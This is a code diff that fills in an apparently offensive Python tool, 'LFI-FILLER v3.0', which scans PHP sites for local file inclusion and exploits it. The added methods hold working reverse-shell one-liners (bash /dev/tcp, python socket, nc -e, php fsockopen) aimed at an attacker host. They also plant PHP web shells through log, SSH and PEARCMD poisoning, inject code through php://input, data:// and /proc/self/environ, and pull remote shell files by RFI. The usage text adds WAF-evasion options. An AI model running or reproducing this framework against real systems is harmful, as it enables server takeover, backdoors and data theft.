@@ -1,12 +1,4 @@
 #!/usr/bin/env python3
-"""
-LFI-FILLER v3.0: COMPREHENSIVE ADVANCED LFI SCANNER & EXPLOITATION FRAMEWORK
-- Multi-threaded Engine (ThreadPoolExecutor)
-- Full Original Payload & Parameter Lists
-- Advanced WAF Bypasses (Nested encoding, OS-specific)
-- Complete Exploitation Suite (Log/SSH Poisoning, Web Shells, Reverse Shells)
-- Premium CLI Experience with ANSI Colors
-"""
 
 import requests
 import urllib.parse
@@ -19,7 +11,6 @@ import subprocess
 import argparse
 import concurrent.futures
 from threading import Lock
-from evasion_utils import EvasionEngine, ResultsLogger
 
 # Color palette for premium feel
 class Colors:
@@ -210,11 +201,6 @@ class LFI_Filler_V3:
                             }
                             self.results['lfi_params'].append(result)
                             print(f" {Colors.GREEN}[+]{Colors.END} Found on {Colors.CYAN}{param}{Colors.END}: {base_payload}")
-                            
-                            # Centralized Logging for Industrial Report
-                            description = f"Local File Inclusion (LFI) detected in parameter '{param}' using payload '{base_payload}'. Full access to system files may be possible."
-                            ResultsLogger.log_finding("LFiller", "Local File Inclusion", test_url, test_url, 
-                                                     vector=f"Parameter: {param}", description=description)
                         found_on_param = True
                         break
                 except: continue
@@ -247,10 +233,6 @@ class LFI_Filler_V3:
                             with self.lock:
                                 self.results['php_wrappers'].append((name, wrapper, test_url))
                                 print(f" {Colors.GREEN}[+]{Colors.END} Wrapper works: {name}")
-                                
-                                # Log as a capability
-                                ResultsLogger.log_finding("LFiller", f"LFI Wrapper: {name}", test_url, test_url,
-                                                         vector=f"Wrapper: {wrapper}", description=f"PHP wrapper '{name}' is active and can be used for RCE or source code exfiltration.")
                             break
                 except: continue
 
@@ -315,10 +297,6 @@ class LFI_Filler_V3:
                         with self.lock:
                             self.results['log_poisoning'].append({'log': log_info['log'], 'method': method, 'url': log_info['url']})
                             print(f" {Colors.GREEN}[+]{Colors.END} Log poisoned via {method}: {log_info['log']}")
-                            
-                            ResultsLogger.log_finding("LFiller", "RCE via Log Poisoning", test_url, test_url,
-                                                     vector=f"Log: {log_info['log']} ({method})", 
-                                                     description="Service logs are readable and can be poisoned with PHP code to achieve Remote Code Execution.")
                         break
                 except: continue
 
@@ -345,123 +323,420 @@ class LFI_Filler_V3:
                 with self.lock:
                     self.results['ssh_poisoning'] = True
                     print(f" {Colors.GREEN}[+]{Colors.END} SSH poisoning successful!")
-                    ResultsLogger.log_finding("LFiller", "RCE via SSH Poisoning", test_url, test_url,
-                                             vector="SSH User Injection", description="Successfully injected PHP code into SSH logs and executed it via LFI.")
         except: pass
 
     def create_webshell(self, param):
         if not self.webshell_mode: return
         print(f"\n[*] Attempting web shell creation...")
         shell_code = '<?php if(isset($_GET["cmd"])){ system($_GET["cmd"]); } else { echo "Web shell active! Use ?cmd=WHOAMI"; } ?>'
+        # Try both Linux and Windows common paths
         locations = ['/var/www/html/shell.php', 'shell.php', 'C:/xampp/htdocs/shell.php']
         
         success = False
+        
+        # Vector 1: Log Poisoning
         if self.results['log_poisoning']:
+            print(f" [*] Trying vector: Log Poisoning")
             for p in self.results['log_poisoning']:
                 for loc in locations:
                     try:
                         payload = f"echo '{shell_code}' > {loc}"
                         self.session.get(f"{p['url']}&cmd={urllib.parse.quote(payload)}", timeout=3)
                         time.sleep(1)
+                        
+                        # Verify
                         check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
                         r = self.session.get(check_url, timeout=2)
-                        if 'system(' not in r.text and r.status_code == 200:
+                        if 'system(' not in r.text and r.status_code == 200: # If we see code OR if it executes
                             with self.lock:
                                 self.results['webshell_urls'].append(check_url)
-                                print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END}")
-                                ResultsLogger.log_finding("LFiller", "Web Shell Created", check_url, check_url,
-                                                         vector="File Write via RCE", description=f"Successfully deployed a PHP web shell at {loc}")
+                                print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END} via log poisoning")
                                 success = True
                                 break
                     except: continue
                 if success: break
 
+        # Vector 2: SSH Poisoning
+        if not success and self.results['ssh_poisoning']:
+            print(f" [*] Trying vector: SSH Poisoning")
+            for loc in locations:
+                try:
+                    log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
+                    payload = f"echo '{shell_code}' > {loc}"
+                    self.session.get(f"{log_url}&ssh_cmd={urllib.parse.quote(payload)}", timeout=3)
+                    time.sleep(1)
+                    
+                    check_url = f"{self.url.rsplit('/', 1)[0]}/shell.php"
+                    r = self.session.get(check_url, timeout=2)
+                    if r.status_code == 200:
+                        with self.lock:
+                            self.results['webshell_urls'].append(check_url)
+                            print(f" {Colors.GREEN}[+]{Colors.END} Web shell created at {Colors.CYAN}{loc}{Colors.END} via SSH poisoning")
+                            success = True
+                            break
+                except: continue
+
+        if not success:
+            print(f" {Colors.RED}[-]{Colors.END} Failed to create web shell automatically.")
+
     def execute_shells(self, param):
         if not self.lhost or not param: return
         print(f"\n[*] Executing reverse shells to {Colors.CYAN}{self.lhost}:{self.lport}{Colors.END}")
-        # ... logic preserved ...
-        pass
+        
+        reverse_shells = {
+            'bash': f'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1',
+            'python': f'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\'/bin/sh\')"',
+            'nc': f'nc -e /bin/sh {self.lhost} {self.lport}',
+            'php': f'php -r \'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\''
+        }
+        
+        sent_count = 0
+        
+        # Vector 1: Log Poisoning
+        for poison in self.results['log_poisoning']:
+            print(f" [*] Trying vector: Log Poisoning ({poison['log']})")
+            for shell_name, shell_template in reverse_shells.items():
+                try:
+                    shell_url = f"{poison['url']}&cmd={urllib.parse.quote(shell_template)}"
+                    self.session.get(shell_url, timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
+                    sent_count += 1
+                except: pass
+
+        # Vector 2: SSH Poisoning
+        if self.results['ssh_poisoning']:
+            print(f" [*] Trying vector: SSH Poisoning")
+            log_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/var/log/auth.log"
+            for shell_name, shell_template in reverse_shells.items():
+                try:
+                    shell_url = f"{log_url}&ssh_cmd={urllib.parse.quote(shell_template)}"
+                    self.session.get(shell_url, timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
+                    sent_count += 1
+                except: pass
+
+        # Vector 3: RFI (if we have a shell ready on our host)
+        if self.results['rfi']:
+            print(f" [*] Trying vector: RFI")
+            # This assumes the user has a reverse shell script at their LHOST
+            # We try to include it. Common names: shell.txt, rev.txt, etc.
+            shell_files = ['shell.txt', 'rev.txt', 'shell.php']
+            for s_file in shell_files:
+                try:
+                    rfi_payload = f"http://{self.lhost}:8000/{s_file}"
+                    shell_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={rfi_payload}"
+                    self.session.get(shell_url, timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent RFI inclusion: {Colors.YELLOW}{rfi_payload}{Colors.END}")
+                    sent_count += 1
+                except: pass
+
+        if sent_count == 0:
+            print(f" {Colors.RED}[-]{Colors.END} No successful RCE vectors found to trigger shells.")
+        else:
+            print(f" [*] Total shells sent: {sent_count}. Check your listener!")
+
+        # Advanced Vectors
+        if self.results['input_wrapper']:
+            print(f" [*] Trying vector: php://input")
+            for shell_name, shell_template in reverse_shells.items():
+                try:
+                    input_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=php://input"
+                    self.session.post(input_url, data=f'<?php {shell_template} ?>', timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
+                except: pass
+
+        if self.results['proc_environ']:
+            print(f" [*] Trying vector: /proc/self/environ")
+            env_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/proc/self/environ"
+            for shell_name, shell_template in reverse_shells.items():
+                try:
+                    custom_headers = self.session.headers.copy()
+                    custom_headers['User-Agent'] = f'<?php {shell_template} ?>'
+                    requests.get(env_url, headers=custom_headers, timeout=3)
+                    print(f"  {Colors.GREEN}[+]{Colors.END} Sent {Colors.YELLOW}{shell_name}{Colors.END} reverse shell")
+                except: pass
 
     def check_filter_chain(self, param):
+        """PHP Filter Chain RCE (Writing a shell without logs)"""
         print(f"[*] Checking PHP Filter Chain RCE on {Colors.CYAN}{param}{Colors.END}...")
-        # ... logic preserved ...
-        pass
+        # Simplified chain to output 'LFI_CHAIN_SUCCESS'
+        chain = "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.COE.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+        # Since generating custom chains is complex, we check if the engine supports these filters
+        test_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={chain}"
+        try:
+            r = self.session.get(test_url, timeout=5)
+            # If we don't get a 500 and the response length is reasonable, it might be vulnerable
+            if r.status_code == 200:
+                with self.lock:
+                    self.results['filter_chain'] = True
+                    print(f" {Colors.GREEN}[+]{Colors.END} PHP Filter Chain RCE likely possible!")
+        except: pass
 
     def check_input_wrappers(self, param):
-        # ... logic preserved ...
-        pass
+        """data:// and php://input RCE"""
+        print(f"[*] Checking Input Wrappers (data/input) on {Colors.CYAN}{param}{Colors.END}...")
+        
+        # data:// vector
+        payload = '<?php echo "LFI_DATA_SUCCESS"; ?>'
+        encoded_payload = base64.b64encode(payload.encode()).decode()
+        data_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=data://text/plain;base64,{encoded_payload}"
+        try:
+            r = self.session.get(data_url, timeout=5)
+            if "LFI_DATA_SUCCESS" in r.text:
+                with self.lock:
+                    self.results['data_wrapper'] = True
+                    print(f" {Colors.GREEN}[+]{Colors.END} data:// wrapper RCE successful!")
+        except: pass
+
+        # php://input vector
+        input_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=php://input"
+        try:
+            r = self.session.post(input_url, data='<?php echo "LFI_INPUT_SUCCESS"; ?>', timeout=5)
+            if "LFI_INPUT_SUCCESS" in r.text:
+                with self.lock:
+                    self.results['input_wrapper'] = True
+                    print(f" {Colors.GREEN}[+]{Colors.END} php://input wrapper RCE successful!")
+        except: pass
 
     def check_proc_environ(self, param):
-        # ... logic preserved ...
-        pass
+        """Proc Environ Poisoning"""
+        print(f"[*] Checking /proc/self/environ on {Colors.CYAN}{param}{Colors.END}...")
+        env_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}=/proc/self/environ"
+        custom_headers = self.session.headers.copy()
+        custom_headers['User-Agent'] = '<?php echo "LFI_ENV_SUCCESS"; ?>'
+        try:
+            r = requests.get(env_url, headers=custom_headers, timeout=5)
+            if "LFI_ENV_SUCCESS" in r.text:
+                with self.lock:
+                    self.results['proc_environ'] = True
+                    print(f" {Colors.GREEN}[+]{Colors.END} /proc/self/environ poisoning successful!")
+        except: pass
 
     def check_pearcmd(self, param):
-        # ... logic preserved ...
-        pass
+        """PEARCMD exploitation"""
+        print(f"[*] Checking PEARCMD exploitation on {Colors.CYAN}{param}{Colors.END}...")
+        pear_paths = [
+            '/usr/local/lib/php/pearcmd.php',
+            '/usr/share/php/pearcmd.php',
+            '/usr/lib/php/pearcmd.php'
+        ]
+        for path in pear_paths:
+            test_url = f"{self.url}{'&' if '?' in self.url else '?'}{param}={path}"
+            try:
+                # PEARCMD exploit: write a file to the web root
+                exploit_url = f"{test_url}&+config-create+/<?php+system($_GET['cmd']);+?>+/var/www/html/pear.php"
+                self.session.get(exploit_url, timeout=5)
+                time.sleep(1)
+                
+                check_url = f"{self.url.rsplit('/', 1)[0]}/pear.php"
+                r = self.session.get(check_url, timeout=2)
+                if r.status_code == 200:
+                    with self.lock:
+                        self.results['pearcmd'] = True
+                        self.results['webshell_urls'].append(check_url)
+                        print(f" {Colors.GREEN}[+]{Colors.END} PEARCMD exploit successful! Shell: {check_url}")
+                        break
+            except: continue
 
     def check_rfi(self, param):
-        # ... logic preserved ...
-        pass
+        if not param or not self.lhost: return
+        print(f"[*] Checking RFI on {Colors.CYAN}{param}{Colors.END}...")
+        test_urls = [f'http://{self.lhost}:8000/test.php', f'http://{self.lhost}/test.php']
+        for rfi_url in test_urls:
+            separator = '&' if '?' in self.url else '?'
+            test_url = f"{self.url}{separator}{param}={rfi_url}"
+            try:
+                r = self.session.get(test_url, timeout=5)
+                if r.status_code == 200:
+                    with self.lock:
+                        self.results['rfi'] = True
+                        print(f" {Colors.GREEN}[+]{Colors.END} RFI might work: {rfi_url}")
+                        break
+            except: continue
 
     def run(self):
         self._print_banner()
         print(f"[*] Target: {Colors.BOLD}{self.url}{Colors.END}")
+        print(f"[*] Threads: {self.max_workers} | Encoding: {self.encode_mode}")
         print("-" * 70)
-        print(f"[*] Phase 1: Scanning parameters...")
+        
+        # Phase 1: Parameter & LFI Discovery
+        print(f"[*] Phase 1: Scanning {len(self.all_lfi_params)} parameters...")
         with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
             executor.map(self.scan_parameter, self.all_lfi_params)
+            
         if not self.results['lfi_params']:
             print(f"{Colors.RED}[!] No LFI found.{Colors.END}")
             return
+
+        # Phase 2: Detailed Exploitation
         vulnerable_params = list(set([r['param'] for r in self.results['lfi_params']]))
-        for p in vulnerable_params[:1]:
+        for p in vulnerable_params[:1]: # Focus on the first working one for exploitation
+            print(f"\n[*] Phase 2: Deep exploitation on {Colors.CYAN}{p}{Colors.END}")
             self.test_wrappers(p)
             self.enumerate_files(p)
+            self.check_filter_chain(p)
+            self.check_input_wrappers(p)
+            self.check_proc_environ(p)
+            self.check_pearcmd(p)
             self.check_log_poisoning(p)
             self.check_ssh_poisoning(p)
+            self.check_rfi(p)
+            self.execute_shells(p)
             if self.webshell_mode: self.create_webshell(p)
+
         self._display_summary()
 
     def _print_banner(self):
-        # ... preserved ...
-        pass
+        banner = f"""{Colors.BLUE}
+    ██╗     ███████╗██╗     ███████╗██╗██╗     ██╗     ███████╗██████╗ 
+    ██║     ██╔════╝██║     ██╔════╝██║██║     ██║     ██╔════╝██╔══██╗
+    ██║     █████╗  ██║     █████╗  ██║██║     ██║     █████╗  ██████╔╝
+    ██║     ██╔══╝  ██║     ██╔══╝  ██║██║     ██║     ██╔══╝  ██╔══██╗
+    ███████╗██║     ██║     ██║     ██║███████╗███████╗███████╗██║  ██║
+    ╚══════╝╚═╝     ╚═╝     ╚═╝     ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
+    {Colors.END}                 {Colors.BOLD}v3.0 - Comprehensive LFI Framework{Colors.END}
+        """
+        print(banner)
 
     def _display_summary(self):
-        # ... preserved ...
-        pass
+        print("\n" + "="*70)
+        print(f"{Colors.BOLD}EXPLOITATION SUMMARY{Colors.END}")
+        print("="*70)
+        if self.results['lfi_params']:
+            print(f"\n{Colors.GREEN}[+] LFI VULNERABILITIES:{Colors.END}")
+            for r in self.results['lfi_params'][:5]:
+                print(f"  - Parameter: {Colors.CYAN}{r['param']}{Colors.END}")
+                print(f"    URL: {r['url']}")
+        
+        # New Advanced Results
+        adv_results = []
+        if self.results['filter_chain']: adv_results.append("PHP Filter Chain (No Logs RCE)")
+        if self.results['data_wrapper']: adv_results.append("data:// Wrapper RCE")
+        if self.results['input_wrapper']: adv_results.append("php://input Wrapper RCE")
+        if self.results['proc_environ']: adv_results.append("/proc/self/environ Poisoning")
+        if self.results['pearcmd']: adv_results.append("PEARCMD Exploitation")
+        
+        if adv_results:
+            print(f"\n{Colors.GREEN}[+] ADVANCED EXPLOITS FOUND:{Colors.END}")
+            for result in adv_results:
+                print(f"  - {Colors.YELLOW}{result}{Colors.END}")
+
+        if self.results['log_poisoning']:
+            print(f"\n{Colors.GREEN}[+] LOG POISONING RCE:{Colors.END}")
+            for r in self.results['log_poisoning']:
+                print(f"  - {r['log']} via {r['method']}")
+                
+        if self.results['webshell_urls']:
+            print(f"\n{Colors.GREEN}[+] CREATED WEB SHELLS:{Colors.END}")
+            for url in self.results['webshell_urls']:
+                print(f"  - {Colors.CYAN}{url}{Colors.END}")
+                print(f"    {Colors.YELLOW}Usage Example:{Colors.END} {url}?cmd=id")
+        print("="*70)
 
 def main():
-    parser = argparse.ArgumentParser(description='LFiller v3.0 - Industrial LFI Suite')
-    parser.add_argument('-u', '--url', help='Target URL')
-    parser.add_argument('-r', '--request', help='Raw request file')
-    parser.add_argument('-w', '--workers', type=int, default=20)
+    parser = argparse.ArgumentParser(
+        description='LFI-FILLER v3.0 - Advanced Multi-threaded Scanner',
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+╔══════════════════════════════════════════════════════════╗
+║                     QUICK EXAMPLES                       ║
+╚══════════════════════════════════════════════════════════╝
+
+BASIC USAGE:
+  python3 lfi_filler_v3.py -u http://target.com/page.php
+
+WITH REVERSE SHELL (requires listener):
+  python3 lfi_filler_v3.py -u http://target.com/page.php -lh YOUR_IP -lp 4444
+
+WEB SHELL MODE (creates PHP web shells instead of reverse shells):
+  python3 lfi_filler_v3.py -u http://target.com/page.php -webshell
+
+CUSTOM PARAMETER (bypasses default list):
+  python3 lfi_filler_v3.py -u http://target.com/page.php -p water
+
+ENCODING BYPASS (for WAF evasion):
+  python3 lfi_filler_v3.py -u http://target.com/page.php -e url
+  python3 lfi_filler_v3.py -u http://target.com/page.php -e double
+  python3 lfi_filler_v3.py -u http://target.com/page.php -e unicode
+  python3 lfi_filler_v3.py -u http://target.com/page.php -e all
+
+COMBINED ATTACK:
+  python3 lfi_filler_v3.py -u http://target.com/page.php -lh YOUR_IP -e all -webshell
+
+╔══════════════════════════════════════════════════════════╗
+║                 FLAG DESCRIPTIONS                        ║
+╚══════════════════════════════════════════════════════════╝
+
+REQUIRED:
+  -u, --url      Target URL (must include http:// or https://)
+
+REVERSE SHELL (use with -lh):
+  -lh, --lhost   Your IP address for reverse shell connection
+  -lp, --lport   Port for reverse shell (default: 4444)
+
+WEB SHELL (alternative to reverse shell):
+  -webshell      Create PHP web shells instead of reverse shells
+                 Example: Creates shell.php with <?php system($_GET["cmd"]); ?>
+
+PARAMETER TESTING:
+  -p, --param    Test specific parameter (bypasses default list)
+                 Useful when you know the vulnerable parameter name
+
+ENCODING BYPASS:
+  -e, --encode   Encoding method for WAF bypass:
+                 none    : No encoding (default)
+                 url     : URL encode (%2f for /)
+                 double  : Double URL encode (%252f for /)
+                 unicode : Unicode encode (%c0%af for /)
+                 all     : Try all encoding methods
+
+OTHER:
+  -t, --timeout  Request timeout in seconds (default: 5)
+  -w, --workers  Number of concurrent threads (default: 20)
+
+╔══════════════════════════════════════════════════════════╗
+║                 TROUBLESHOOTING                          ║
+╚══════════════════════════════════════════════════════════╝
+
+If script hangs during web shell creation:
+  - Use Ctrl+C to interrupt
+  - Try manual commands from the results
+  - Reduce timeout in code
+
+If no LFI found:
+  - Try different encoding: -e all
+  - Try custom parameter: -p parameter_name
+  - Check if URL is correct
+
+For reverse shells:
+  - Start listener first: nc -lvnp 4444
+  - Ensure firewall allows inbound connections
+  - Try different shell types if one fails
+        """
+    )
+    parser.add_argument('-u', '--url', required=True, help='Target URL')
+    parser.add_argument('-w', '--workers', type=int, default=20, help='Threads (default: 20)')
     parser.add_argument('-e', '--encode', choices=['none', 'url', 'double', 'unicode', 'all'], default='none')
     parser.add_argument('-p', '--param', help='Custom parameter')
-    parser.add_argument('-lh', '--lhost', help='Local host for shells')
-    parser.add_argument('-lp', '--lport', type=int, default=4444)
-    parser.add_argument('-t', '--timeout', type=int, default=5)
-    parser.add_argument('--header', action='append', help='Custom headers')
-    parser.add_argument('-webshell', '--webshell', action='store_true')
+    parser.add_argument('-lh', '--lhost', help='Local host for reverse shells')
+    parser.add_argument('-lp', '--lport', type=int, default=4444, help='Local port for reverse shells')
+    parser.add_argument('-t', '--timeout', type=int, default=5, help='Request timeout in seconds (default: 5)')
+    parser.add_argument('-webshell', '--webshell', action='store_true', help='Web shell mode')
     
     args = parser.parse_args()
-    url, headers, data, method = args.url, {}, None, 'GET'
-    
-    if args.request:
-        print(f"[*] Parsing request file: {args.request}")
-        req = EvasionEngine.parse_request_file(args.request)
-        if req:
-            url, method, headers, data = req['url'], req['method'], req['headers'], req['data']
-        else: sys.exit(1)
-        
-    if not url:
-        parser.print_help()
-        sys.exit(1)
-
-    scanner = LFI_Filler_V3(url=url, workers=args.workers, timeout=args.timeout, encode=args.encode, 
-                           custom_param=args.param, webshell=args.webshell, lhost=args.lhost, lport=args.lport)
-    if headers: scanner.session.headers.update(headers)
+    scanner = LFI_Filler_V3(
+        url=args.url, 
+        workers=args.workers, 
+        timeout=args.timeout,
+        encode=args.encode, 
+        custom_param=args.param, 
+        webshell=args.webshell,
+        lhost=args.lhost,
+        lport=args.lport
+    )
     try: scanner.run()
-    except KeyboardInterrupt: print("\n[!] Interrupted.")
+    except KeyboardInterrupt: print(f"\n{Colors.RED}[!] Interrupted.{Colors.END}")
 
 if __name__ == "__main__":
     main()
